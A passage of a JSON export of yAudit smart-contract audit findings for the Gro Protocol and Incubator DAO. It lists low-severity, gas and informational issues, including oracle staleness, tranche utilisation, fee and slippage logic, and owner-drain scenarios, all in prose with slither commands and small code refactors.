        "body": "One example showing the mixup between the OpenZeppelin and solmate ERC20 libraries is in IGVault and GVault. IGVault imports IERC20 from OpenZeppelin while GVault imports ERC20 from solmate. The solmate ERC20 library has EIP-2612 support while OpenZeppelin does not include such logic in the default ERC20 file and instead packages it in the file draft-ERC20Permit.sol. The way the code is currently written may be confusing for protocols integrating with Gro Protocol because The GVault ERC4626 token will support EIP-2612 but the GToken (and therefore the JuniorTranche and SeniorTranche) will not. Because the tranche is intended to be a wrapper for the GVault ERC4626, which does support permit(), this is not ideal because the tranche wrapper does not support permit() like the GVault ERC4626. The below slither commands can be used to demonstrate the difference in EIP2612 support. slither-check-erc --erc ERC2612 --solc-remaps \"@openzeppelin/=lib/openzeppelin-contracts/ @chainlink/=lib/chainlink-brownie-contracts/ ds-test/=lib/forge-std/lib/ds-test/src/\" ./src/tokens/GToken.sol GToken slither-check-erc --erc ERC2612 --solc-remaps \"@openzeppelin/=lib/openzeppelin-contracts/ @chainlink/=lib/chainlink-brownie-contracts/ ds-test/=lib/forge-std/lib/ds-test/src/\" ./src/GVault.sol GVault",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Similar functions have different logic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "executeStopLoss() includes the line if (strategy == address(0)) continue; which is not in canExecuteStopLossPrimer(). Likewise, canExecuteStopLossPrimer() includes the line if (strategyCheck[strategy].primerTimestamp == 0) continue; which is not in executeStopLoss(). The two functions should share logic. Currently, the lack of a zero check for strategyCheck[strategy].primerTimestamp in executeStopLoss() means a rogue keeper could execute a stop loss before primerTimestamp has been set to a non-zero value.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. ConvexStrategy owner can sweep tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Many DeFi protocols attempt to remain immutable to enable the user to maintain control over their assets at all times. While the underlying asset token is prevented from owner sweeping, the rewards returned by the Curve metapool are impacted as are the metapool LP tokens. This could lead to loss of user funds if the owner count is compromised or acts maliciously. In order to increase trust in the protocol, the owner should be a sufficiently distributed multisig to allow users to trust it.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Inconsistent minimum reward amount",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "_claimableRewards() should compare the WETH value of rewards to MIN_WETH_SELL_AMOUNT and not to , otherwise _claimableRewards() will not return a value if the amount of rewards has a value of less than 1 ETH, which is quite a large requirement for rewards values to be included in the calculations in rewards(). The existing strategy code will underestimate the rewards returned by _estimatedTotalAssets() when the value of _claimableRewards() is between 1E16 WETH and 1E18 WETH which impacts the PnL calculations.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Inconsistent metapool fee inclusion",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The Curve docs describe calc_token_amount(), which is used in divest(), with the following: This calculation accounts for slippage, but not fees. It should be used as a basis for determining expected amounts when calling add_liquidity or remove_liquidity_imbalance, but should not be considered to be precise! This means that in invest(), the slippage calculation compares _credit, the initial 3CRV token amount, with amount * ratio, which is the 3CRV value after slippage and fees. In contrast, divest() compares _debt, the initial 3CRV token amount, with meta_amount * ratio, which is the 3CRV value after slippage but without fees.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Potentially incorrect branching logic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "This line of realisePnl() is unreachable because if loss > _excessDebt evaluates to true, to flow would have entered this if statement instead. The duplicate line of logic should be removed or changed. The comment of here for safety, but should really never be the case before the line of code that is duplicated and never reached indicates some of the nuance of the branching may not be fully understood.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. setStrategies() doesn't set strategyCheck values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "setStrategies() does not allow setting values in strategyCheck, which is in contrast to addStrategy(). This could impact the use case where setStrategies() is useful. For example, if strategyCheck values are not set, the strategy will never return true in functions like canEndStopLoss().",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Weak oracle result staleness check in staleCheck()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "staleCheck() only checks that the Chainlink price data is under 24 hours old. The staleness check does not consider whether the roundId data may be outdated. It is recommended to do both, as shown in other security report findings here and here. Specifically, the DAI/USD oracle updates more regularly than every 24 hours. Considering that the Gro protocol has protections in place for stablecoins losing their peg, improving the Chainlink price staleness check is a crucial consideration.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. No minDeposit in GTranche",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "GVault sets a minDeposit value to prevent very small 1 wei deposits. GTranche has no comparable minimum value. When combined with the implementation of utilization() adding 1 wei to the denominator, the lack of a minDeposit is problematic in the following scenario: The utilisationThreshold is set to 3E4, implying there can be 3 tokens deposit into the Senior Tranche for every token deposited into the Junior Tranche 1 wei is deposited into the Junior Tranche 3 wei is deposited into the Senior Tranche, which should be the maximum amount permitted to maintain the 3-to-1 ratio With the current tranche holdings, utilization() returns a value of (3 * 1E4) / (1+1) = 15000, which is half of the utilisationThreshold limit of 3E4 An additional 3 wei can be deposited into the Senior Tranche. Now utilization() returns (6 * 1E4) / (1+1) = 30000, but the ratio of Senior Tranche deposits to Junior Tranche deposits is 6-to-1, not the originally intended 3-to-1 Beyond the risk of underinsured Senior Tranche deposits, another side effect of the lack of minDeposit is the possibility of an inflation attack.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Volatile token price causes higher vault fees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "_calcFees() is called only once in GVault, from report(). _calcFees() is a bit of a misnomer because the function also takes those fees and sends them to the feeCollector address specified by the owner using setFeeCollector() while returning the gains amount minus fees. The gains are defined as the difference between all the strategy's assets (loose assets, LP tokens, and rewards) and the strategy's debt, which is a value stored in strategies[strategyAddress].totalDebt in the GVault. A key part of this is that when a strategy reports a loss, the totalDebt of the strategy is reduced to account for the loss, so it is as though the strategy received fewer assets to begin with. The combination of how fees are taken from gains and the goal post for how gains are calculated getting moved on every loss creates a problematic combination. Consider the following series of events: Value of Strategy is $1000 Strategy loses $20 and report() is triggered Strategy gains $20 and report() is triggered (pays vault fee on $20 gains) Strategy loses $20 and report() is triggered Strategy gains $20 and report() is triggered (pays vault fee on $20 gains) The strategy has paid the vault fee twice even though the value in the strategy hasn't changed. It is only the volatility in the strategy's assets that caused the fees to be applied. This penalizes depositors for market volatility instead of penalizing them for withdrawing, which is how the Gro protocol is documented to work today. Note that this specific strategy is built on 3CRV and the Frax Curve metapool, so the value of the LP tokens should only increase and not be subject to such volatility. By deducting fees at the time of profit, there is less value in the vault to compound and grow, which slightly reduces the appeal of the strategy.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. High default slippage tolerance",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The default value of PERCENTAGE_DECIMAL_FACTOR if 1E4 while baseSlippage is 50. This means the default tolerance is (10000 - 50) / 10000 = 9950 / 10000 = 99.5%, allowing for 0.5% slippage, in invest() and divest(). When the Frax metapool was examined at the time of this review, the Curve Finance frontend estimated a 0.03% slippage if withdrawing 1E8 LP tokens, which was over 20% of the total supply of the metapool. Similarly, when estimating the slippage for a deposit of 1E8 CRV tokens, which would increase the existing balance of CRV in the metapool by over 50%, the frontend estimated a 0.06% slippage. Given the size of the slippage with such large deposits or withdrawals, and considering that the default slippage tolerance on the Curve frontend for this Frax metapool is 0.1%, the existing combination of PERCENTAGE_DECIMAL_FACTOR and baseSlippage provides too large of a slippage tolerance.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Use prefix in loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "There are instances of this throughout the contracts, with examples of this optimization opportunity found in GStrategyGuard.sol, GTranche.sol, and GRouter.sol.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Unnecessary zero initializations",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "There are instances of this throughout the contracts, with examples of this optimization opportunity found in GTranche.sol, GRouter.sol, StrategyQueue.sol, and ConvexStrategy.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Use simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The withdraw() function in ConvexStrategy provides one example of this, but there are other instances in the contracts: if (withdrawnAssets <= _amount) { loss += _amount - withdrawnAssets; } else { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0; } } By switching around the if/else clauses, we can replace the compound operator with a simple one if (withdrawnAssets > _amount) { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0; } } else { loss += _amount - withdrawnAssets; }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Remove redundant check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "mint() in GVault checks if assets is zero and then checks if assets is less than minDeposit. The first check is redundant because if assets is zero, then assets < minDeposit is true and it will revert in the next check. This suggestion assumes that minDeposit should be 10 ** _asset.decimals() instead of _asset.decimals(), since 10 ** X where X is a uint cannot result in a value of zero. Separately, the returns in mint(), deposit(), and withdraw() are unnecessary and can be removed because the return value is the same as the named return variable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Require statements are found in the JuniorTranche, SeniorTranche, GToken, and GVault contracts (examples include 1, 2, 3, 4). Using this new solidity feature can provide gas savings on revert conditions.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Declare variables immutable when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The IsGTrancheSet boolean is set only once in GMigration.sol and can be immutable.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "One example where unchecked can be applied: - loss = lastTotal - totalValue; + unchecked { loss = lastTotal - totalValue; } Similar savings can be found throughout the contracts including here, here, and here.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Unusual minDeposit choice",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "This line of GVault.sol may have a typo if the intent is to have a minimum deposit of at least one dollar (because the vault is designed for stablecoins).",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Fees may be sent to address(0)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The GVault default is to have vaultFee and feeCollector remain unset, which keeps them at the default values of 0 and address(0) respectively. It is possible for vaultFee to be set to a non-zero value while feeCollector remains at zero, resulting in fees getting sent to address(0).",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Missing _minAmount check in redeem",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "deposit() and mint() verify the deposit amount is greater than minDeposit while withdraw() checks that the asset amount is greater than the user-specified _minAmount before transferring tokens. redeem() does have a comparable minimum value check before assets are transferred.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. _owner argument shadows Ownable state variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "withdraw() in GVault.sol has a _owner argument that shadows a state variable with the same name in OpenZeppelin's Ownable library.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Junior tranche lacks immediate withdrawal guarantees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "In order to deposit in the Senior Tranche, there must be sufficient value in the Junior Tranche to protect Senior Tranche deposits. This means that if the Junior Tranche protects the Senior Tranche 1-to-1 and there is 100% utilization, no Junior Tranche funds can be withdraw. In the event that all depositors to the Junior Tranche wish to withdraw, there could be a \"bank run\" where the first users to withdrawer receive their funds, but when the utilization ratio hits 100%, no Junior Tranche funds can be withdrawn because they are needed to protect the funds in the Senior Tranche. This behaviour is the norm for tranche structures, but users who have not interacted with such a pool design may not clearly understand the limitations of the system. This could be problematic for users if they have a loan in a protocol like Aave that is about to be liquidated and they cannot withdraw their funds from the Junior Tranche to increase their loan collateralization ratio. A real scenario where this would be incentivized to take place is a \"leach attack\", when the fixed yield on the Senior Tranche exceeds what the underlying vault is capable of producing and the Senior Tranche depositors leach off the Junior Tranche value. If the Senior Tranche promised an absurdly high fixed yield, or if the underlying vault yield drops to a near-zero value, the Senior Tranche depositors would be more incentivized to keep their token in the Senior Tranche to receive the \"impossibly good\" yield, even though the yield the Senior Tranche is receiving is being taken from the token value of the Junior Tranche depositors (because the yield from the vault cannot cover the fixed yield amount). It is true that the tranche owner can set the fixed rate with setRate(), but there may be a delay before this happens (possibly a DAO vote), during which time value could be leached from Junior Tranche depositors and the Junior Tranche depositors would be unable to withdraw because 1. the utilization ratio does not permit it 2. the leaching causes a loss of value in the Junior Tranche which makes the utilization ratio even worse.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Change call sequence for reentrancy mitigation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "In _withdraw(), funds are transferred out of the GVault before the vaultAssets state variable is updated. According to checks-effects-interactions, the external interactions should happen last, meaning the vaultAssets variable should be updated before funds are transferred. This is what the solmate ERC4626 implementation does by calling the internal _burn() first to update the totalSupply value before transferring funds, which is the opposite of when the transfer happens relative to _mint() in mint(). The same change can be applied to redeem() and report() (1, 2).",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Undocumented assumption of private Gelato mempool",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "MEV protection mitigates the risk of a frontrun, backrun, or sandwich that can extract value from a transaction. This most often happens during swap operations. The design of Gro Protocol assumes that when a Gelato keeper executes a transaction, there will be MEV protection. The Gelato documentation does not clarify that this is a guarantee that keepers offer and whether there is still risk of an uncle bandit attack. The MEV mitigation is expected to exist based on discussions with the Gro devs, but the lack of official documentation around the mempool guarantees provided by Gelato jobs, the possibility of changes over time, and the risk of a rogue Gelato keeper are all possible concerns with this approach.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Inconsistent interface files",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "metapool is cast as ICurve3Pool here because get_virtual_price() is found in the external Curve3Pool contract and is inherited by the metapool contract. However, the same could be said about remove_liquidity_one_coin(), but metapool is cast as ICurveMeta when removing liquidity (1, 2, 3) because the Curve3Pool usage in ConvexStrategy didn't use that function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Inconsistent Uniswap array indices",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Uniswap references the amountOut value with amounts[amounts.length - 1] with comparing that value to amountOutMin, and this approach is found once in ConvexStrategy. Another approach of hard coding an index of 1 is found elsewhere.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. _additionalRewardTokens() works in unexpected way",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "In rewards(), _additionalRewardTokens() is summed with _claimableRewards(). The latter returns the value of claimable rewards that can be received if getReward() is called as it is in sellAllRewards(). In contrast, _additionalRewardTokens() does not do this. Instead, _additionalRewardTokens() sums the current balance of award tokens in the strategy. This can result in a different value than the return value of sellAllRewards(), which is likely unexpected behaviour.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Non-ideal _sellAdditionalRewards() min reward limit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Consider a value different from the current MIN_REWARD_SELL_AMOUNT used in _sellAdditionalRewards() because different tokens have different decimals values and different values. A more flexible choice of value would be preferable to enable flexibility with future reward tokens.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Strategy migration logic can revert",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "divestAll() is written to avoid a revert condition at all costs because it is intended to be used for the emergency scenario where reverting is not an option. divestAll() is called immediately before migratePool(). After the migration, realisePnl() is called which has has divest() calls (1, 2) which offer an opportunity for a revert to happen. This could prevent the migration from happening in some circumstances.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Theoretical casting overflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "This line of StopLossLogic casts a uint256 dy_diff to an int256 value. It is possible a very large unsigned value would be converted to a negative number.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Differing approach to keeper role",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The keeper variable in GStrategyGuard stores a single address while a similar keepers variable in ConvexStrategy allows for multiple addresses to serve as keepers. Allowing more keepers provides more flexibility if Gelato changes their operations to have multiple addresses executing transactions, or to allow the owner address to serve as a keeper.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Duplicate strategies possible with setStrategies()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "_addStrategy() does not permit a strategy to be added to the strategies array if it is already in the array. But the owner could use setStrategies() to do the same.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. Unnecessary ERC4626 casting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "getYieldToken() in FixedTokensCurve returns an ERC4626 value. But GTranche needlessly casts this return value to an ERC4626 in several places (1, 2, 3, 4).",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. getSwappingPrice() doesn't make sense with single strategy and vault",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "The Gro protocol as examined only has one token that is deposited into it, as the return value of getYieldToken() shows. The current implementation of getSwappingPrice() allows any uint256 input values for function arguments i and j and always returns the input _amount which implies a 1-to-1 exchange rate between token i and token j. This return value doesn't make sense. It would make more sense to follow an implementation like getYieldToken() shows and only allow an i and j value of zero, reverting in other cases.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. No upper limit to Junior Tranche leverage or fixed yield",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Setting an upper bound on the leverage available to a Junior Tranche, and therefore a lower bound on the protection available to Senior Tranche depositors, may be prudent to avoid blatant misuse of the Gro tranche design. Additionally consider a limit on the fixed yield amount, which could be adjusted by the protocol owner depending on market conditions. Be aware that the yield in the tranche design is dollar denominated, so if the underlying asset drops in value, there could be issues in paying the fixed yield to the Senior Tranche. We can take one example of the Junior Tranche taking 20x leverage by borrowing from the Senior Tranche, with a fixed Senior Tranche yield of 2%: 100% utilizationRatio * (20x leverage - 1x from Junior Tranche) * 2% Senior Tranche Fixed Yield = 38% borrowing cost owed to Senior Tranche Due to the amount of leverage in the Junior Tranche and the yield promised to the Senior Tranche depositors, the Junior Tranche could easily see losses if it cannot continue to deliver the 38% yield.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Multiple migration functions increase trancheBalances",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "migrateFromOldTranche() increases the tranche balances here. migrate() does so here. The two migration functions appear to serve different purposes, but a boolean protecting the two functions from both getting called does not exist. Instead, hasMigratedFromOldTranche is only found in migrateFromOldTranche().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. Unclear redistribution of vault fees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Existing Gro protocol documentation mentions the withdrawal fees are redistributed back to the protocol. While this may not be true with the upgraded Gro protocol, if the fees are to be redistributed to the protocol, it should be done in a way that is not gameable.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Tranche tokens not compliant with ERC4626",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "To clarify, the tranche tokens do not currently implement ERC4626 but the documentation uses the word \"ERC4626 wrapper\" when describing the tranche, which could be misleading. GVault and tranche tokens import the same ERC4626 to implement basic ERC4626 support. GVault overrides many virtual functions from this import to implement them correctly according to ERC4626 specifications, but GTranche does not. The functions that should be implemented in GTranche to comply with ERC4626 include: mint() deposit() withdraw() redeem() convertToShares() convertToAssets() maxRedeem() previewRedeem() maxWithdraw() previewWithdraw() maxMint() previewMint() maxDeposit() previewDeposit()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Silent returns",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "move() in StrategyQueue silently returns in three cases. This may give the owner calling moveStrategy() a false sense of confidence that the strategy was moved, when it in fact was not.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. Minor nitpicks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-Gro-Protocol.md",
        "body": "Consider naming withdrawalQueue(uint256 i) to withdrawalQueueAt(uint256 i) and withdrawalQueue() to fullWithdrawalQueue(). Consider clarifying the strategy return value is an address, not a Strategy struct. getStrategyDebt() and getStrategyAssets() return the totalDebt of a strategy and might be improved with more similar names to avoid confusion over debt vs. assets. NatSpec is incomplete for some functions, such as missing return value descriptions for beforeWithdraw()/excessDebt/_excessDebt and no NatSpec for _removeStrategy() in GVault depositIntoTrancheForCaller() is missing a comment that _token_index of 3 or greater is 3CRV Typo: adapetr -> adapter Typo: Apporve -> Approve Typo: CHIANLINK_FACTOR -> CHAINLINK_FACTOR Typo: add_liquididty -> add_liquidity Typo: strategies -> strategy's and same here Typo: enstimated -> estimated Typo: excluding and profits -> excluding profits Typo: srategy -> strategy Typo: do generate -> to generate Typo: unledrying -> underlying Typo: beneth -> beneath and here Typo: baring -> bearing Typo: extensoin -> extension Typo: their -> there Typo: underlyng -> underlying Typo: prive -> price Typo: it -> its Typo: utiliszation -> utilisation Typo: _tranchTokens -> _trancheTokens Typo: between to underlying -> between the underlying Typo: amount of price -> amount of yield token Typo: and ontermiadry -> an intermediary Typo: amount of transform (unclear what this means) Typo: setUtilizationThreshold() (note utilization with a 'z') sets the variable utilisationThreshold (note utilisation with 's') and there is a function utilization() (note utilization with a 'z') Typo: experiene -> experience Improve precision by changing ((_lockedProfit / _releaseTime) * _timeSinceLastReport) to ((_lockedProfit * _timeSinceLastReport) / _releaseTime) to match Vault.vy approach Fix this comment that references a non-existent emergencyExit() function The emergency boolean function argument is missing a NatSpec comment as is _calcFactor() in GTranche and _loss in PnL The debt variable is not used for any purpose. It may be better to simply compare debtPayment to the value of _excessDebt(msg.sender) to replace the safeMath in this line. Inaccurate NatSpec for withdraw()'s _amount (better would be \"asset quantity needed by Vault if not holding enough asset balance\") and missing NatSpec for return values Replace PnL magic numbers with constants. For example, replace 10000 with utilisationThreshold. Junior Tranche is branded as GVT token, so this comment should replace PWRD with GVT Consider a better name than \"controller\" or \"ctrl\" in GToken for the GTranche address, because the word \"controller\" does not appear anywhere in GTranche Assets in Convex are not locked and therefore are not used to vote in reward distribution. There are potential downsides to this approach and this choice should be documented somewhere in Gro's documentation. The strategy that ConvexStrategy was inspired by does lock some tokens for voting. _claimableRewards() in ConvexStrategy does not return a value if MIN_REWARD_SELL_AMOUNT is not met and this if statement is not entered Consider replacing slippage in divestAll() with the baseSlippage value used elsewhere because baseSlippage can be modified by the owner unlike slippage estimatedTotalAssets() should replace _estimatedTotalAssets(true) with _estimatedTotalAssets(false) because the rewards return value is not needed Incomplete NatSpec for factor in _calcTrancheValue() and factor elsewhere in GTranche This return is redundant, the named return values would be returned properly without this line The SafeMath OpenZeppelin import in GToken is redundant because solidity 0.8.10 is used. The contract should be updated accordingly. The Ownable import in GToken is redundant because the import of Whitelist.sol includes Ownable already _calcTokenAmount() can remove the _deposit boolean function argument because it is never used for anything useful in the function The NatSpec in CurveOracle uses the term \"yield token\" to mostly refer to 3CRV while FixedTokensCurve NatSpec uses \"yield token\" to mostly refer to GVault shares. Consider terms that more clearly differentiate the tokens. Remove unused _tranche bool function argument from _calcTrancheValue() Remove if (_factor == 0) logic from _calcTrancheValue() because this can never happen based on current contract logic lastDistribution could be uint32 instead of uint64 Consider renaming _calcFees() to _gainSubFees()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. On-chain contracts assume off-chain trust",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "The 90-day phase 1 period of the Incubator DAO ROOK rage quit process will involve swapping ROOK for pROOK at a 1-to-1 exchange rate. Along with the pROOK token, USDC will also be received at a rate specified by the exchangeRate value. The ROOK token will effectively be pegged to a specific number of USDC tokens during Phase 1. There are some ROOK holders that are excluded from participating in this redemption process according to the governance proposal, but there is no logic in the exchangeROOK.sol contract to prevent these parties from interacting with the contract. This could result in the draining of USDC held in the contract by these excluded parties, which would effectively cause a bank run on the exchangeROOK.sol contract because some ROOK holders will not be able to receive their promised USDC at the set exchange rate. However, it should be noted that the evidence of these acts would be visible on-chain and there is a level of established trust between the ROOK holders which allowed the current governance proposal to be agreed on. Another scenario that would have a negative impact for ROOK holders would involve the Incubator DAO multisig withdrawing ROOK from exchangeROOK.sol using withdrawAssets() to take all the USDC from this contract before other ROOK holders can redeem their tokens. By depositing ROOK into exchangeROOK.sol to get USDC, then using withdrawAssets() to withdraw the ROOK, then depositing ROOK into exchangeROOK.sol ad infinitum, the USDC would get drained from exchangeROOK.sol. This would also effectively cause a bank run on the exchangeROOK.sol contract because some ROOK holders will not be able to receive their promised USDC at the set exchange rate. An alternative approach for the Incubator DAO multisig to gain value is to withdraw ROOK from exchangeROOK.sol using withdrawAssets(), then to swap the ROOK tokens in a liquidity pool before the ROOK token has no value. While the liquidity pool would be imbalanced and be arbitraged due to the set exchangeRate value in exchangeROOK.sol, the multisig could once again take any new ROOK tokens deposited into exchangeROOK.sol and swap it into a liquidity pool again until the exchangeROOK.sol holds no more USDC.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Contract owner can manipulate value received by ROOK or pROOK holders",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "The contract owner will be a 3-of-4 multisig and should generally be a trusted party. However, if this assumption does not hold true, there are several ways the owner could manipulate the value received by ROOK or pROOK token holders: withdrawAssets() could take out all the USDC from the exchangeROOK.sol or exchangepROOK.sol contracts. The mint() function in prook.sol can be called at any time for any amount. The owner could mint many pROOK tokens at the start of Phase 2 and sweep all the USDC from this contract before other token holders get the chance to redeem their pROOK. The setExchangeRate() function could be called to change the ROOK-USDC or pROOK-USDC exchangeRate value in exchangeROOK.sol or exchangepROOK.sol, giving some users more or less USDC in return for their ROOK tokens.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Remove ERC20Votes.sol import",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
